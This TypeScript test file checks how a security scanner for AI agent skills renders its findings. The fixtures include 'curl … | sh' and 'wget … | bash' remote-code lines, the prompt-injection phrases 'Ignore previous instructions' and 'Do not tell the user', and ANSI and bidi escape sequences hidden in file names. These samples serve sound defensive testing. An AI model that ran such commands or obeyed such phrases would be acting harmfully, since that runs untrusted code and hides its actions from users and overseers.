import { expect, test } from "bun:test";
import type { Finding } from "../core/scan/index.ts";
import { renderFindings } from "./report.ts";

const ESC = "\u001B";

test("renderFindings renders the supplied help literally", () => {
  const findings: Finding[] = [
    {
      severity: "critical",
      confidence: "high",
      rule: "hooks",
      help: "literal help from the scanner",
      file: "SKILL.md",
      line: 4,
      detail: "PreToolUse -> ./inspect.sh",
    },
    {
      severity: "warn",
      confidence: "high",
      rule: "executable",
      help: "ships an executable",
      file: "scripts/run.sh",
      detail: "executable file",
    },
  ];

  expect(Bun.stripANSI(renderFindings("fixture", findings))).toBe(
    [
      "fixture: security scan",
      "",
      "1 critical finding",
      "  hooks: literal help from the scanner",
      "    SKILL.md:4  PreToolUse -> ./inspect.sh",
      "",
      "1 warn finding",
      "  executable: ships an executable",
      "    scripts/run.sh  executable file",
    ].join("\n"),
  );
});

test("renderFindings marks a low-confidence finding and no other", () => {
  const findings: Finding[] = [
    {
      severity: "warn",
      confidence: "low",
      rule: "prompt-injection",
      help: "asks the agent to hide actions",
      file: "SKILL.md",
      line: 5,
      detail: "Do not tell the user",
    },
    {
      severity: "warn",
      confidence: "medium",
      rule: "prompt-injection",
      help: "asks the agent to hide actions",
      file: "notes.md",
      line: 2,
      detail: "Ignore previous instructions",
    },
  ];

  expect(Bun.stripANSI(renderFindings("fixture", findings))).toBe(
    [
      "fixture: security scan",
      "",
      "2 warn findings",
      "  prompt-injection: asks the agent to hide actions",
      "    SKILL.md:5  Do not tell the user (low confidence)",
      "    notes.md:2  Ignore previous instructions",
    ].join("\n"),
  );
});

test("renderFindings keeps an accepted critical finding under critical and marks it accepted", () => {
  const curl = {
    severity: "critical",
    confidence: "high",
    rule: "curl-pipe-shell",
    help: "runs downloaded code",
    file: "setup.sh",
  } as const;
  const findings: Finding[] = [
    { ...curl, line: 2, detail: "curl https://x.invalid | sh", accepted: true },
    { ...curl, line: 5, detail: "wget -qO- https://x.invalid | bash" },
  ];

  expect(Bun.stripANSI(renderFindings("fixture", findings))).toBe(
    [
      "fixture: security scan",
      "",
      "2 critical findings",
      "  curl-pipe-shell: runs downloaded code",
      "    setup.sh:2  curl https://x.invalid | sh (accepted)",
      "    setup.sh:5  wget -qO- https://x.invalid | bash",
    ].join("\n"),
  );
});

const executableAt = (file: string, detail: string): Finding => ({
  severity: "warn",
  confidence: "high",
  rule: "executable",
  help: "ships an executable",
  file,
  detail,
});

test("renderFindings escapes control characters in file paths and aligns the escaped text", () => {
  const rendered = renderFindings("fixture", [
    executableAt(`run${ESC}[2J.sh`, "first"),
    executableAt("a\u202Eb", "second"),
  ]);

  expect(rendered).not.toContain(ESC + "[2J");
  expect(Bun.stripANSI(rendered).split("\n").slice(-2)).toEqual([
    "    run^[[2J.sh  first",
    "    a<U+202E>b   second",
  ]);
});

test("renderFindings escapes control characters in the skill name and the detail", () => {
  const rendered = renderFindings(`evil${ESC}[2J`, [
    {
      severity: "warn",
      confidence: "high",
      rule: "symlink",
      help: "links inside the skill",
      file: "link",
      detail: `symlink \u2192 a${ESC}]8;;x\u0007\u202Eb`,
    },
  ]);

  expect(rendered).not.toContain(ESC + "[2J");
  expect(rendered).not.toContain(ESC + "]8");
  expect(Bun.stripANSI(rendered).split("\n")).toEqual([
    "evil^[[2J: security scan",
    "",
    "1 warn finding",
    "  symlink: links inside the skill",
    "    link  symlink \u2192 a^[]8;;x^G<U+202E>b",
  ]);
});
